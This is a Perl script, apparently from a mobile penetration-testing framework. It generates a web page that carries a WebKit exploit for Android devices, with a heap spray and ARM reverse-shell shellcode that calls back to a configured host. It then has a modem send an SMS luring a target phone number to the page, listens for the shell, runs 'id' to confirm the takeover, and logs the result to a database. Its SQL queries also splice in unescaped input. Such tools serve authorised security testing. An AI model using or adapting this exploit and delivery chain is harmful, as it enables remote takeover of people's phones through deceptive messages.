#!/usr/bin/perl
use Cwd;
use DBI;
use Expect;
use IO::Socket;
$dir = getcwd;
$configfile = $dir . "/config";
open(CONFIG, "+<$configfile");
while (<CONFIG>)
{
        chomp;
        s/#.*//;
        s/^\s+//;
        s/\s+$//;
        ($var, $value) = split(/\s*=\s*/, $_, 2);
        $Variables{$var} = ${value};
}
$webserver = $Variables{"WEBSERVER"};
        $sqlserver = $Variables{"MYSQLSERVER"};
        $ipaddress = $Variables{"IPADDRESS"};
	$shellipaddress = $Variables{"SHELLIPADDRESS"};	
	$path = $ARGV[0];
	$filename = $ARGV[1];
	$number = $ARGV[2];
        $modem = $ARGV[3];       
	$link = "http://" . $ipaddress . $path . $filename;
                	$fullpath = $webserver. $path;
                	$command1 = "mkdir " . $fullpath;
                	system($command1);
			$ipaddresscopy = $shellipaddress;
			@octets = split(/\./, $ipaddresscopy);
			$out1 = pack "c", @octets[0];
			$hex1 = unpack "H2" , $out1;
			$out2 = pack "c", @octets[1];
                	$hex2 = unpack "H2" , $out2;
			$out3 = pack "c", @octets[2];
                	$hex3 = unpack "H2" , $out3;
  			$out4 = pack "c", @octets[3];
                	$hex4 = unpack "H2" , $out4;
			$sploitfile = $webserver . $path . $filename;
			$command8 = "touch " . $sploitfile;
       		 	system($command8);
        		$command9 = "chmod 777 " . $sploitfile;
        		system($command9);
        		open(SPLOITFILE, ">$sploitfile");
       			print SPLOITFILE "<html>\n";
			print SPLOITFILE "<head>\n";
			print SPLOITFILE "<script>\n"; 
			print SPLOITFILE "var ip = unescape(\"\\u" . $hex2 . $hex1 . "\\u" . $hex4 . $hex3 . "\");\n";
			print SPLOITFILE "var port = unescape(\"\\u3930\");\n";
			print SPLOITFILE "function trigger()\n";
			print SPLOITFILE "{\n";
			print SPLOITFILE "var span = document.createElement(\"div\");\n";
			print SPLOITFILE "document.getElementById(\"BodyID\").appendChild(span);\n";
			print SPLOITFILE "span.innerHTML = -parseFloat(\"NAN(ffffe00572c60)\");\n"; 
			print SPLOITFILE "}\n";
			print SPLOITFILE "function exploit()\n";
			print SPLOITFILE "{\n";   
			print SPLOITFILE "var nop = unescape(\"\\u33bc\\u0057\");\n";
			print SPLOITFILE "do\n";
			print SPLOITFILE "{\n";
			print SPLOITFILE "nop+=nop;\n";
			print SPLOITFILE "} while (nop.length<=0x1000);\n";
			print SPLOITFILE "var scode = nop+unescape(\"\\u1001\\ue1a0\\u0002\\ue3a0\\u1001\\ue3a0\\u2005\\ue281\\u708c\\ue3a0\\u708d\\ue287\\u0080\\uef00\\u6000\\ue1a0\\u1084\\ue28f\\u2010\\ue3a0\\u708d\\ue3a0\\u708e\\ue287\\u0080\\uef00\\u0006\\ue1a0\\u1000\\ue3a0\\u703f\\ue3a0\\u0080\\uef00\\u0006\\ue1a0\\u1001\\ue3a0\\u703f\\ue3a0\\u0080\\uef00\\u0006\\ue1a0\\u1002\\ue3a0\\u703f\\ue3a0\\u0080\\uef00\\u2001\\ue28f\\uff12\\ue12f\\u4040\\u2717\\udf80\\ua005\\ua508\\u4076\\u602e\\u1b6d\\ub420\\ub401\\u4669\\u4052\\u270b\\udf80\\u2f2f\\u732f\\u7379\\u6574\\u2f6d\\u6962\\u2f6e\\u6873\\u2000\\u2000\\u2000\\u2000\\u2000\\u2000\\u2000\\u2000\\u2000\\u2000\\u0002\");\n";
			print SPLOITFILE "scode += port;\n";
			print SPLOITFILE "scode += ip;\n";
			print SPLOITFILE "scode += unescape(\"\\u2000\\u2000\");\n";
			print SPLOITFILE "target = new Array();\n";
			print SPLOITFILE "for(i = 0; i < 0x1000; i++)\n";
			print SPLOITFILE "target[i] = scode;\n";
			print SPLOITFILE "for (i = 0; i <= 0x1000; i++)\n";
			print SPLOITFILE "{\n";
			print SPLOITFILE "document.write(target[i]+\"<i>\");\n";
			print SPLOITFILE "if (i>0x999)\n";
			print SPLOITFILE "{\n";
			print SPLOITFILE "trigger();\n";
			print SPLOITFILE "}\n";
			print SPLOITFILE "}\n";
			print SPLOITFILE "}\n";
			print SPLOITFILE "</script>\n";
			print SPLOITFILE "</head>\n";
			print SPLOITFILE "<body id=\"BodyID\">\n";
			print SPLOITFILE "Enjoy!\n";
			print SPLOITFILE "<script>\n";
			print SPLOITFILE "exploit();\n";
			print SPLOITFILE "</script>\n";
			print SPLOITFILE "</body>\n";
			print SPLOITFILE "</html>\n";
        		close(SPLOITFILE);
              
               	 		$username = $Variables{"MYSQLUSER"};
                		$password = $Variables{"MYSQLPASS"};
                		$port = $Variables{"MYSQLPORT"};
                		    $type = $Variables{"DATABASETYPE"};
                                        if ($type eq "postgres")
                                        {
                                                $dbh = DBI->connect("DBI:Pg:dbname=framework;host=$sqlserver",$username,$password);
                                        }
                                        elsif ($type eq "mysql")
                                        {
                                                $dbh = DBI->connect("dbi:mysql:database=framework;host=$sqlserver;port=$port", $username,$password);
                                        }
				$pathquery = "SELECT path from modems where id=" . $modem;
                        	$sql = $dbh->prepare($pathquery);
                        	$results = $sql->execute;
				@rows = $sql->fetchrow_array();
                        	$path2 = @rows[0];
                        	$keyquery = "SELECT controlkey from modems where id=" . $modem;
                        	$sql = $dbh->prepare($keyquery);
                        	$results2 = $sql->execute;
                        	@rows = $sql->fetchrow_array();
                        	$key2 = @rows[0];
                        	$control = $webserver . $path2 . "/getfunc";
                        	open(CONTROLFILE, ">$control");
                        	$command2 = $key2 . " " . "SEND" . " " . $number . " " . "This is a cool page: " . $link;
                        	print CONTROLFILE $command2;
                        	close(CONTROLFILE);
				$vulnerable = "no";
				$socket = new IO::Socket::INET (LocalHost => $shellipaddress, LocalPort => '12345', Proto => 'tcp' , Listen => 1, Reuse => 1, Timeout=> 180);
				if ($data_socket = $socket->accept())
				{
					$data="/system/bin/id\n";
					print $data_socket $data;
					$data=<$data_socket>;
					print $data;
					close($data_socket);
					$vulnerable = "yes";
				}



$table = "client";
        $sqlserver = $Variables{"MYSQLSERVER"};
        $username = $Variables{"MYSQLUSER"};
        $password = $Variables{"MYSQLPASS"};
        $port = $Variables{"MYSQLPORT"};
        $type = $Variables{"DATABASETYPE"};
        if ($type eq "postgres")
        {
                   $dbh = DBI->connect("DBI:Pg:dbname=framework;host=$sqlserver",$username,$password);
	           $number2 = "\'" . $number . "\'";
                   $vulnerable2 = "\'" . $vulnerable . "\'";
                   $webkit = "\'" . "webkit" . "\'";

	}
        elsif ($type eq "mysql")
        {
                   $dbh = DBI->connect("dbi:mysql:database=framework;host=$sqlserver;port=$port", $username,$password);
  		   $number2 = "\"" . $number . "\"";
		   $vulnerable2 = "\"" . $vulnerable . "\""; 
		   $webkit = "\"" . "webkit" . "\"";
	}
	$insertquery = "INSERT INTO $table (id,number,exploit,vuln) VALUES (DEFAULT,$number2,$webkit,$vulnerable2)";
	$sql = $dbh->prepare($insertquery);
	$sql->execute;
